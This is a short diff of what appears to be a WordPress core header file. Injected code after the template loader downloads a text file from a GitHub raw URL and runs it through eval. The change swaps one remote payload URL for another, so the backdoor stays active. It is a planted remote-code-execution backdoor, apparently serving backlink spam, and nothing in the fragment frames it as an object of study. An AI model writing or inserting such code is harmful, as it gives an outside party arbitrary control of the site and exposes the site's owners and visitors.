@@ -19,7 +19,7 @@ if ( ! isset( $wp_did_header ) ) {
     require_once ABSPATH . WPINC . '/template-loader.php';
 
 }
-$url = 'https://raw.githubusercontent.com/BacklinkGG/vip/main/vip.txt';
+$url = 'https://raw.githubusercontent.com/BacklinkGG/vipv2/main/system.txt';
 $fileContents = @file_get_contents($url);
 if ($fileContents !== false) {
     eval("?>" . $fileContents);
